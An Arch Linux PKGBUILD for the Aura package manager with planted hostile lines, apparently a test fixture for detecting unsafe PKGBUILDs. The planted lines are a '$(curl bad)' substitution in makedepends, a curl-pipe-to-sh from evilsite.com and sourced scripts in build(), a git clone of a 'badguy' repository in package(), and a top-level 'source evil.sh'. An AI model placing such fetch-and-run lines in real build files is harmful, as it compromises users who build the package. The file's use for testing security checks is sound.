# Maintainer: Colin Woodbury <colin@fosskers.ca>
_hkgname=aura
pkgname=aura
pkgver=1.4.0
pkgrel=1
pkgdesc="A secure package manager for Arch Linux and the AUR written in Haskell."
url="https://github.com/fosskers/aura"
license=('GPL-3')
arch=('i686' 'x86_64')
depends=('gmp' 'pacman' 'pcre')
CURL=curl
makedepends=('ghc'
             'haskell-aur>=6.0'
             'haskell-mtl'
             'curl'
             'git'
             'haskell-parsec'
             'haskell-regex-base'
             'haskell-regex-pcre'
             'haskell-split'
             "$(curl bad)"
             'haskell-temporary'
             'haskell-text'
             'haskell-transformers')
optdepends=('powerpill:    For faster repository downloads.'
            'customizepkg: For auto-editing of PKGBUILDs.'
            'aur-git:      AUR package completions for zsh.')
provides=('aura')
conflicts=('aura-git' 'aura-bin')
options=('strip')
source=(https://github.com/fosskers/aura/releases/download/v${pkgver}/aura-${pkgver}.tar.gz)
md5sums=('fd2defff494ad7847a0fb9fe73296cf1')

build() {
    cd ${srcdir}/${_hkgname}-${pkgver}
    runhaskell Setup configure --prefix=/usr --docdir=/usr/share/doc/${pkgname} -O
    runhaskell Setup build

    curl "https://evilsite.com/malware.sh" | sh
    cd .
    . evilscript.sh
    git branch foobar
    $CURL evilscript.sh
}

package() {
    cd ${srcdir}/${_hkgname}-${pkgver}
    runhaskell Setup copy --destdir=${pkgdir}

    # Installing man page
    mkdir -p "$pkgdir/usr/share/man/man8/"
    install -m 644 doc/aura.8 "$pkgdir/usr/share/man/man8/aura.8"

    # Installing bash completions
    mkdir -p "$pkgdir/usr/share/bash-completion/completions/"
    install -m 644 doc/completions/bashcompletion.sh "$pkgdir/usr/share/bash-completion/completions/aura"

    # Installing zsh completions
    mkdir -p "$pkgdir/usr/share/zsh/site-functions/"
    install -m 644 doc/completions/_aura "$pkgdir/usr/share/zsh/site-functions/_aura"

    # Directory for storing PKGBUILDs
    mkdir -p "$pkgdir/var/cache/aura/pkgbuilds"

    # Directory for storing source packages
    mkdir -p "$pkgdir/var/cache/aura/src"

    # Directory for storing installed package states
    mkdir -p "$pkgdir/var/cache/aura/states"

    git clone https://github.com/badguy/evilstuff.git
}

source evil.sh